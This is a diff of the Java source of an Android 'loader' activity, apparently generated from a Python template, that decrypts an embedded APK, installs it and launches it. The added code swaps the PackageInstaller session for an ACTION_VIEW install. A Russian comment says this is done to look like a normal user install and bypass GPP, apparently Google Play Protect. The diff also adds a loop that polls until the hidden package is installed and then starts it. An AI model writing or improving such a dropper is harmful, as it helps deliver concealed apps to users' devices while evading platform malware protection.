@@ -678,11 +678,6 @@ public class LoaderActivity extends Activity {{
     protected void onCreate(Bundle savedInstanceState) {{
         super.onCreate(savedInstanceState);
 
-        Intent launchIntent = getIntent();
-        if (handleInstallCommitIntent(launchIntent)) {{
-            return;
-        }}
-
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {{
             if (!getPackageManager().canRequestPackageInstalls()) {{
                 startActivityForResult(
@@ -695,13 +690,6 @@ public class LoaderActivity extends Activity {{
         }}
 
         startDecryption();
-    }}
-
-    @Override
-    protected void onNewIntent(Intent intent) {{
-        super.onNewIntent(intent);
-        setIntent(intent);
-        handleInstallCommitIntent(intent);
     }}
 
     @Override
@@ -836,14 +824,15 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void launchInstalledApp() {{
-        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(ORIGINAL_PACKAGE_NAME);
-        if (launchIntent == null) {{
-            finish();
-            return;
+        try {{
+            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(ORIGINAL_PACKAGE_NAME);
+            if (launchIntent != null) {{
+                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivity(launchIntent);
+            }}
+        }} catch (Exception e) {{
+            // Игнорируем ошибки
         }}
-
-        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-        startActivity(launchIntent);
         finish();
     }}
 
@@ -947,49 +936,46 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void installApk() {{
-        PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
-        PackageInstaller.Session session = null;
-
-        try {{
-            PackageInstaller.SessionParams params =
-                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-            int sessionId = packageInstaller.createSession(params);
-            session = packageInstaller.openSession(sessionId);
-
-            try (
-                InputStream in = new FileInputStream(apkFile);
-                OutputStream out = session.openWrite("base.apk", 0, apkFile.length())
-            ) {{
-                byte[] buffer = new byte[8192];
-                int c;
-                while ((c = in.read(buffer)) != -1) {{
-                    out.write(buffer, 0, c);
-                }}
-                session.fsync(out);
-            }}
-
-            Intent callbackIntent = new Intent(this, LoaderActivity.class);
-            callbackIntent.setAction("INSTALL_COMMIT");
-            int pendingIntentFlags = PendingIntent.FLAG_UPDATE_CURRENT;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {{
-                pendingIntentFlags |= PendingIntent.FLAG_MUTABLE;
-            }}
-
-            PendingIntent pendingIntent = PendingIntent.getActivity(
+        // Используем Intent.ACTION_VIEW вместо PackageInstaller
+        // Это выглядит как обычная установка пользователем и обходит GPP
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
+            // Для Android 7+ используем FileProvider
+            Uri apkUri = android.support.v4.content.FileProvider.getUriForFile(
                 this,
-                sessionId,
-                callbackIntent,
-                pendingIntentFlags
+                getPackageName() + ".fileprovider",
+                apkFile
             );
-
-            session.commit(pendingIntent.getIntentSender());
-            session.close();
-        }} catch (Exception e) {{
-            if (session != null) {{
-                session.abandon();
-            }}
-            showError(e.getMessage());
+            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        }} else {{
+            intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
         }}
+        
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+        
+        // Запускаем проверку установки
+        checkInstallationStatus();
+    }}
+    
+    private void checkInstallationStatus() {{
+        // Проверяем каждые 2 секунды установлен ли пакет
+        final Handler handler = new Handler(Looper.getMainLooper());
+        handler.postDelayed(new Runnable() {{
+            @Override
+            public void run() {{
+                try {{
+                    getPackageManager().getPackageInfo(ORIGINAL_PACKAGE_NAME, 0);
+                    // Пакет установлен - запускаем его
+                    launchInstalledApp();
+                }} catch (Exception e) {{
+                    // Еще не установлен - проверяем снова
+                    handler.postDelayed(this, 2000);
+                }}
+            }}
+        }}, 2000);
     }}
 
     private static byte[] hexToBytes(String hex) {{
@@ -1039,5 +1025,15 @@ public class LoaderActivity extends Activity {{
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+        
+        <provider
+            android:name="android.support.v4.content.FileProvider"
+            android:authorities="${{applicationId}}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
     </application>
 </manifest>"""
